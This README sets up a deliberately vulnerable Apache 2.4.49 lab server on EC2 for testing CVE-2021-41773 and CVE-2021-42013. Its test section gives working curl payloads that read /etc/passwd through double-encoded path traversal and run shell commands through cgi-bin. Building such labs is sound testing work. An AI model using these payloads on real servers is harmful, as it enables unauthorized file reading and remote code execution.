# Vulnerable Apache 2.4.49 - CVE-2021-41773 / CVE-2021-42013

Vulnerable Apache server for testing path traversal and RCE exploits.

> **WARNING**: Intentionally vulnerable - for authorized testing only.

## Vulnerabilities

| CVE | Description | Impact |
|-----|-------------|--------|
| CVE-2021-41773 | Path traversal (`%2e`) | File read |
| CVE-2021-42013 | Double encoding bypass (`%%32%65`) | File read + RCE |

---

## EC2 Deployment (One Command)

### 1. Launch EC2
- **AMI**: Amazon Linux 2023 or Ubuntu 22.04
- **Type**: t2.micro
- **Security Group**: SSH (22) + Custom TCP (8080) - your IP only

### 2. Deploy (first time or any update)

```bash
# Copy entire folder to EC2
scp -i ~/.ssh/guinea_pigs.pem -r apache_2.4.49 ubuntu@15.160.68.117:~

# Run setup
ssh -i ~/.ssh/guinea_pigs.pem ubuntu@15.160.68.117 "bash ~/apache_2.4.49/setup.sh"
```



---

## Test Vulnerability

```bash
# Read /etc/passwd
curl "http://<IP>:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"

# RCE
curl -X POST "http://<IP>:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
  -d "echo Content-Type: text/plain; echo; id"
```

---


## AWS Target Group Health Check

Use this endpoint for ALB/NLB health checks:

| Setting | Value |
|---------|-------|
| **Path** | `/health` |
| **Port** | `8080` |
| **Protocol** | `HTTP` |
| **Success codes** | `200` |

---

## Cleanup

```bash
docker-compose down          # Stop container
# Then terminate EC2 instance
```

